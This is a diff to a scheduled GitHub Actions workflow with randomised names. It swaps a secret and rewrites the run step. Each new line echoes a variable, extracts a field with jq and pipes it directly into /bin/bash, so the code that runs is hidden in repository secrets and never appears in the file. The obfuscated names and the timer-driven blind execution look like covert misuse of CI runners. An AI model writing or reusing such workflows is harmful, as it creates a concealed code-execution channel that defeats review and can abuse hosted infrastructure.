@@ -1,10 +1,11 @@
 name: dingweidwa
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 3/6 * * *'
+    - cron: '23 5/6 * * *'
 
-jobs:  # 29933
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,19 +13,12 @@ jobs:  # 29933
       - uses: actions/checkout@v4
       - name: dingweidwa
         env:
-          n59977: ${{ secrets.n59977 }}
+          y3: ${{ secrets.y3 }}
         run: |
-          echo $n59977 | jq -r .bf99 | /bin/bash
-          echo $mycjo509 | jq -r .g1 | /bin/bash
-          echo $eve7 | jq -r .qov0 | /bin/bash
-          echo $r39 | jq -r .u3 | /bin/bash
-          echo $j44 | jq -r .cre58312 | /bin/bash
-          echo $h6 | jq -r .ptnc75 | /bin/bash
-          echo $wbv5707 | jq -r .t11 | /bin/bash
-          echo $ftzf33 | jq -r .y9 | /bin/bash
-          echo $xhjp31206 | jq -r .fndr206 | /bin/bash
-          echo $jn086 | jq -r .a98825 | /bin/bash
-          echo $cmerq21 | jq -r .fq220 | /bin/bash
-          echo $esxvs4263 | jq -r .b821 | /bin/bash
-          echo $jvtre442 | jq -r .ulk15 | /bin/bash
+          echo $y3 | jq -r .fnkqv658 | /bin/bash
+          echo $q7 | jq -r .snp155 | /bin/bash
+          echo $lem79304 | jq -r .jjco38262 | /bin/bash
+          echo $h03756 | jq -r .zld30593 | /bin/bash
+          echo $uyop116 | jq -r .uzbc043 | /bin/bash
+          echo $om1 | jq -r .xktz429 | /bin/bash
 
